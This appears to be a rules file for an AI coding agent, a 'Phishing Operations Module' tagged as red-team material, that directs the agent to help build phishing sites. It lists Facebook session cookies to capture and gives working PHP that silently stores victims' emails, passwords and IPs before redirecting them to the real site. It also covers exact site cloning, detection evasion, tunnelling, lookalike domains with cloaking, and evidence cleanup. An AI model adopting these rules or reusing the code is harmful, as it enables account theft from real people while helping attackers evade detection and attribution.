---
trigger: model_decision
description: "TAGS: [redteam,phishing,credential-harvesting] | TRIGGERS: phishing,credential,harvest,template,facebook | SCOPE: phishing | DESCRIPTION: Phishing infrastructure and credential harvesting patterns"
globs:
---
# Phishing Operations Module

## Scope
This module covers credential harvesting, phishing infrastructure, and social engineering technical implementation.

## Credential Harvesting Patterns

### Facebook Session Tokens
Priority tokens to capture:
| Token | Purpose | Critical |
|-------|---------|----------|
| c_user | User ID | Yes |
| xs | Session | Yes |
| datr | Browser FP | Yes |
| fr | Tracking | No |
| sb | Browser ID | No |

### Capture Implementation
```php
<?php
// Silent credential capture
$data = [
    'email' => $_POST['email'] ?? '',
    'pass' => $_POST['pass'] ?? '',
    'ip' => $_SERVER['REMOTE_ADDR'],
    'ua' => $_SERVER['HTTP_USER_AGENT'],
    'time' => time()
];

// Encrypted storage
$encrypted = openssl_encrypt(
    json_encode($data),
    'AES-256-CBC',
    $key,
    0,
    $iv
);

file_put_contents('data.enc', $encrypted . PHP_EOL, FILE_APPEND | LOCK_EX);

// Redirect to real site
header('Location: https://facebook.com');
exit;
?>
```

## Template Standards

### Design Requirements
- Match target site exactly (colors, fonts, spacing)
- Mobile-first responsive design
- Include realistic error messages
- Progressive form validation
- Loading states and spinners

### Anti-Detection
- No suspicious JavaScript patterns
- Minimal external resources
- Valid SSL certificate
- Clean HTML structure
- No automation indicators

## Infrastructure

### Tunneler Integration
Supported:
- Cloudflared
- LocalXpose
- Serveo
- Ngrok (with caution)

### Domain Strategy
- Use lookalike domains
- Implement cloaking
- Rotate regularly
- Avoid flagged registrars

## OPSEC Requirements

1. **Credential Encryption**
   - Never store plaintext
   - Use strong encryption
   - Secure key management

2. **Attribution Masking**
   - Use proxies/VPNs
   - Clean metadata
   - Randomize patterns

3. **Evidence Cleanup**
   - Auto-delete logs
   - Clear temp files
   - Rotate infrastructure
